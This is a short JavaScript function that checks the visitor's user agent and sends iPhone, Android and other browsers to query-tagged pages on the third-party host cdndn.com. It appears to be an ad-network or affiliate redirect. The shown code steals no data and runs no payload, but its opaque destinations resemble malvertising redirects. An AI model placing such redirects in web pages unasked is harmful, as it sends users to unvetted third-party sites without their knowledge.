function redirectToSocialindia() {
  const userAgent = navigator.userAgent;

  if (userAgent.match(/iPhone/i)) {
    window.location.href = "https://cdndn.com/srv.html?id=5528061&pub=2430831";
  } else if (userAgent.match(/Android/i)) {
    window.location.href = "https://cdndn.com/srv.html?id=5527915&pub=2430831";
  } else {
    window.location.href = "https://cdndn.com/srv.html?id=5528061&pub=2430831";
  }
}
